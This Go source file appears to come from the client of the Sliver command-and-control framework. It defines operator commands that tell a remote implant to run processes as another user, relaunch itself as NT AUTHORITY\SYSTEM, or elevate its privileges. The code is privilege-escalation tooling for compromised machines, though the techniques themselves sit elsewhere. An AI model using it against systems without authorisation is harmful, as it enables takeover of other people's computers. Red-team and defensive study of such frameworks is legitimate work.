package command

import (
	"fmt"
	consts "sliver/client/constants"
	"sliver/client/spin"
	pb "sliver/protobuf/client"
	sliverpb "sliver/protobuf/sliver"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

func impersonate(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}
	username := ctx.Flags.String("username")
	process := ctx.Flags.String("process")
	arguments := ctx.Flags.String("args")

	if username == "" {
		fmt.Printf(Warn + "please specify a username\n")
		return
	}

	if process == "" {
		fmt.Printf(Warn + "please specify a process path\n")
	}

	impersonate, err := runProcessAsUser(username, process, arguments, rpc)
	if err != nil {
		fmt.Printf(err.Error())
		return
	}
	if impersonate.Output != "" {
		fmt.Printf(Info+"Sucessfully ran %s %s on %s\n", process, arguments, ActiveSliver.Sliver.Name)
	}
}

func getsystem(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}
	_, err := runProcessAsUser(`NT AUTHORITY\SYSTEM`, ActiveSliver.Sliver.Filename, "", rpc)
	if err != nil {
		fmt.Printf(err.Error())
		return
	}

}

func elevate(ctx *grumble.Context, rpc RPCServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}
	ctrl := make(chan bool)
	go spin.Until("Starting a new sliver session...", ctrl)
	data, _ := proto.Marshal(&sliverpb.ElevateReq{SliverID: ActiveSliver.Sliver.ID})
	resp := rpc(&pb.Envelope{
		Type: consts.ElevateStr,
		Data: data,
	}, defaultTimeout)
	ctrl <- true
	if resp.Error != "" {
		fmt.Printf(Warn+"Error: %s", resp.Error)
		return
	}
	elevate := &sliverpb.Elevate{}
	err := proto.Unmarshal(resp.Data, elevate)
	if err != nil {
		fmt.Printf(Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}
	if !elevate.Success {
		fmt.Printf(Warn+"Elevation failed: %s\n", elevate.Err)
		return
	}
	fmt.Printf(Info + "Elevation successful, a new sliver session should pop soon.")
}

// Utility functions
func runProcessAsUser(username, process, arguments string, rpc RPCServer) (impersonate *sliverpb.Impersonate, err error) {
	data, _ := proto.Marshal(&sliverpb.ImpersonateReq{
		Username: username,
		Process:  process,
		Args:     arguments,
		SliverID: ActiveSliver.Sliver.ID,
	})

	resp := rpc(&pb.Envelope{
		Type: consts.ImpersonateStr,
		Data: data,
	}, defaultTimeout)
	if resp.Error != "" {
		err = fmt.Errorf(Warn+"Error: %s", resp.Error)
		return
	}
	impersonate = &sliverpb.Impersonate{}
	err = proto.Unmarshal(resp.Data, impersonate)
	if err != nil {
		err = fmt.Errorf(Warn+"Unmarshaling envelope error: %v\n", err)
		return
	}
	return
}
